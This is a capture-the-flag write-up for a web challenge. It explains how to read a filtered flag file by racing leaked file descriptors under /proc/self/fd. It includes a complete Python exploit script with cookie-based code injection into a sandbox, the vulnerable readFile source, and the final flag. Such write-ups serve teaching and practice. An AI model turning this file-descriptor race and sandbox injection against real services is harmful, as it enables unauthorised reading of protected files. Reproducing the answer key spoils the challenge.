#### Into the Backrooms 4 - Hard

*This challenge has four different parts. The source code is always the same. The parts build on each other and you should work on them in their order.

It seems like you were somehow able to execute the checkout function. Impressive. But seriously, you need to stop. There is now way that you are able to read the last flag. Don't even try.*

*Connection information: <br>
*hostname:8085*

<br>

[into_the_backrooms.zip](../../Public/into_the_backrooms.zip)

<br>

This is were things really get complicated. We are able to bypass the admin validation in the checkout function and we can execute certain functions defined in a sandbox. The last flag is on the file system of the host. The sandbox allows us to execute a `readFile` function with a path. It allows us the read files on the host if the user `app` has permissions to read the file. We are not allowed to use the term flag in the path. If we do so, the content of the file will not be returned to us. The file however will still be read. This means we need to read the `flag.txt` without using its name. There are two concepts we need to familiarize with first to be able to understand the solution: The `/proc` filesystem and `file descriptors`.

For each process there is a folder inside the `/proc` filesystem named after the PID, process id, of the process. It contains information about the running process. The link `self` points to the process reading the file system. In our case we don't need to find the PID as we can just use `self`. The process folders in `/proc` contain a subfolder named `fd`. It contains all the file descriptors that currently exist for the process. File descriptors are unique integer IDs and each of them points to a different open file in the kernel. A file descriptor is created when a file is opened and deleted when the file is explicitly closed. The file descriptors are links to the original file. This is our possibility to address the flag file under a different name. The only problem is that we won't know which file descriptor is associated with our flag file. So we will have to try all of them. Due to the behaviour of the `readFile` function we are able to open a file descriptor to the flag file even if the content is not returned to us. 

The final solution looks something like this:
1. Start a thread that reads the flag over and over again. This will create the file descriptors `/proc/self/fd`.
2. Start another thread that tries to read the files in `/proc/self/fd`.
3. Repeat 1. and 2. in a loop until the flag is returned. 

A python solve script will look like this:

```python
from time import sleep

import requests
import threading
import uuid

base_url = 'http://localhost:8000/'

register_url = base_url + 'register'

username = str(uuid.uuid4())
username = username.replace('-', '')

register_data = {
    'username': username,
    'password': '12345678'
}

r = requests.post(url=register_url, json=register_data)

if r.json()['error']:
    print("Registration failed!")
    exit()

login_url = base_url + 'login'

login_data = register_data

r = requests.post(url=login_url, json=login_data)

if r.json()['error']:
    print("Login failed!")
    exit()

cookies = r.cookies.get_dict()
passwd = cookies['passwd']
uid = cookies['uid']


def e_formatter(n):
    a = '{:.4E}'.format(float(n))
    e = a.find('E')
    return '0.{}{}{}{:02d}'.format(a[0], a[2:e], a[e:e + 2], abs(int(a[e + 1:]) * 1 + 1))


uid = e_formatter(uid)

checkout_url = base_url + 'checkout'


def create_fd():
    order = 'a = _=> { return readFile`/flag.txt` + a`` }, a``'

    COOKIES = {
        'order': order,
        'passwd': passwd,
        'uid': uid
    }

    r = requests.get(url=checkout_url, cookies=COOKIES)


def read_flag(flag):
    order = ''
    for i in range(30):
        order += 'readFile`/proc/self/fd/{}`,'.format(i)
    order = order[:-1]

    COOKIES = {
        'order': order,
        'passwd': passwd,
        'uid': uid
    }

    r = requests.get(url=checkout_url, cookies=COOKIES)

    try:
        if r.json()['error']:
            print("Trying again!")
    except (TypeError, requests.exceptions.JSONDecodeError) as e:
        if "nland" in r.text:
            r = r.text.split('\\n')[1]
            flag[0] = r


flags = ['failed']
flag = ['failed']

while "nland" not in flag:
    t1 = threading.Thread(target=create_fd)
    t2 = threading.Thread(target=read_flag, args=(flags,))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    flag = flags[0]
    sleep(1.0)

print(flag)
```

The start of the script registers a new user and logs into it and creates the uid cookie in scientific notation. The second part then sends the requests to retrieve the flag.
The `readFile` function reads the file specified by path through `fs.readFileSync(path)`. This function creates a file descriptors, reads the file and closes the file descriptors. If we call the `readFile` function multiple times during a run in the sandbox, the timeout will eventually run out. If this happens at the exact same time as the file descriptor is still open, it won't get closed.

```js
readFile: (path) => {
    path = new String(path).toString()
    if(fs.statSync(path).size == 0)
        return null
    let r = fs.readFileSync(path)
    if(!path.includes('flag'))
        return r
    return null
}
```

The `create_fd` function reads the flag file over and over again and creates the file descriptors as described above.

The `read_flag` function tries to read the flag from the file desciptors. We are not guaranteed a hit on the first try. This is because the `create_fd` function first needs to create the open file descriptors. After a while there are enough file descriptors so that we will be able to find an open one before the timeout and can read the flag. We will execute the two functions at the same time in separate threads in a loop. Eventually the script will print out the flag.

The flag is `nland{wh0_70ld_y0u_4b0u7_pr0c_4nd_f1l3_d35cr1p70r5?}`.
